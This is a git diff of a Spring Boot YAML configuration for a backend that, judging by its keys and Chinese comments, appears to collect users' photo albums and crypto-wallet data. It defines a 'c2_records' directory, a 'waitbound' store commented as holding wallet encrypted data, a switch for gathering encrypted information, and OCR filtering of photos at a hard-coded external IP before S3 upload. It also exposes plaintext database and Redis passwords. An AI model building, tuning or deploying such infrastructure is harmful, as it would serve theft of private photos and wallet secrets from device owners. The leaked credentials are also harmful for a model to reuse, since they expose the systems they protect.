@@ -1,5 +1,5 @@
 server:
-  port: 8104
+  port: 8204
   max-http-header-size: 2MB
   connection-timeout: 10s
   tomcat:
@@ -22,9 +22,9 @@ spring:
     nacos:
       discovery:
         server-addr: http://127.0.0.1:8848
-        namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试1
+        #namespace: a5b3bd13-9c96-4216-93fb-8b077e537f46 #测试1
         #namespace: 0e71ca2d-2a33-48c1-922a-5d388210e675 #测试2
-        #namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
+        namespace: 31ee03b7-c6df-436d-990d-d6c08aa5c20a #开发
   mvc:
     pathmatch:
       matching-strategy: ant_path_matcher
@@ -39,7 +39,7 @@ spring:
   redis:
     host: 127.0.0.1
     port: 6379
-    password: 123456
+    #password: 123456
     database: 0
     timeout: 5000ms
     lettuce:
@@ -56,12 +56,12 @@ spring:
 
   datasource:
     driver-class-name: com.mysql.cj.jdbc.Driver
-    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
-    #username: root
-    #password: Root@123
     url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
-    username: ioslianjie
-    password: BAF4R22mwenXXxEH
+    username: root
+    password: Root@123
+    #url: jdbc:mysql://127.0.0.1:3306/ioslianjie?useUnicode=true&characterEncoding=utf-8&serverTimezone=GMT%2B8
+    #username: ioslianjie
+    #password: BAF4R22mwenXXxEH
     type: com.alibaba.druid.pool.DruidDataSource
     initialSize: 10
     minIdle: 10
@@ -77,16 +77,29 @@ spring:
     breakAfterAcquireFailure: false
 
 consumer:
+  # --- 角色开关（同包双机；也可用启动参数覆盖）---
+  # 主机：  main-enabled=true  album-enabled=false
+  # 相册机：main-enabled=false album-enabled=true
+  # 单机：  两者都 true
+  channel:
+    main-enabled: false
+    album-enabled: true
   # 落盘根
-  #upload-dir: D:/c2_records
-  upload-dir: /opt/news4/data/apilog
-  #图片落盘位置
-  #photo-dir: D:/c2_records/photos
+  upload-dir: D:/c2_records
+  #upload-dir: /opt/news4/data/apilog
+  # ---------- 相册 /p（总开关在 ctwo：api18.photo-enabled）----------
+  photo-cloud-enabled: true             # true=上 S3；false=回退本地盘
+  photo-cloud-key-prefix: photos
+  photo-ocr-enabled: true              # true=OCR 过滤后上云；false=关闭 OCR，全部上云
+  photo-ocr-base-url: http://154.82.73.206:8210 #OCR服务接口地址
+  photo-ocr-connect-timeout-ms: 3000
+  photo-ocr-read-timeout-ms: 60000
+  # 本地回退目录（仅 photo-cloud-enabled=false 时用）
   photo-dir: /opt/news4/data/photos
   photo-url-prefix: data/photos
   #钱包加密数据落盘位置
-  #waitbound-dir: "D:/c2_records/waitbound"
-  waitbound-dir: /opt/news4/data/waitbound
+  waitbound-dir: "D:/c2_records/waitbound"
+  #waitbound-dir: /opt/news4/data/waitbound
   waitbound-task-enabled: true #是否开启加密信息收集
   waitbound-threads: 2
   waitbound-poll-interval-ms: 800
@@ -112,10 +125,10 @@ consumer:
   news4-threads: 8
   news4-poll-interval-ms: 300
   news4-claim-idle-ms: 600000
-  photo-threads: 3
+  photo-threads: 6                      # poller；相册机可再提到 8（对齐 17 Redis notify-worker 思路）
   photo-poll-interval-ms: 500
   photo-claim-idle-ms: 600000
-  photo-batch-size: 16
+  photo-batch-size: 32                  # 对齐 17 notify-read-count-t 量级
   nb-notestore-threads: 3
   nb-notestore-poll-interval-ms: 800
   nb-notestore-claim-idle-ms: 900000
@@ -187,6 +200,26 @@ news4:
     max-size: 16
     queue-capacity: 10000
 
+# 相册旁路（与 photo poller 隔离；满则丢图保 LAG；对齐 17）
+photo:
+  # 读盘/SHA/幂等：ACK 后在此执行
+  dispatch-pool:
+    core-size: 8
+    max-size: 16
+    queue-capacity: 4000
+  filter-pool:                          # 调 OCR；勿长期超过 OCR max-concurrent
+    core-size: 16
+    max-size: 32
+    queue-capacity: 2048
+  upload-pool:                          # S3
+    core-size: 16
+    max-size: 32
+    queue-capacity: 2000
+  # 上云后批量写 album（凑满或按间隔刷）
+  batch-insert-enabled: true
+  batch-insert-size: 10
+  batch-insert-interval-ms: 500
+
 #飞机消息线程池（突发时队列加大；并发仍限流防刷爆 TG）
 telegram-msg-stream:
   async-pool:
@@ -239,3 +272,10 @@ monitor:
     timeout-ms: 8000
     pool-size: 12
     max-concurrent: 10
+
+# 相册 S3（与 17 同桶可复用；key-prefix 用 photos 区分路径）
+s3:
+  file_bucket: ''
+  access_key: ''
+  secret_key: ''
+  aws_region: ''
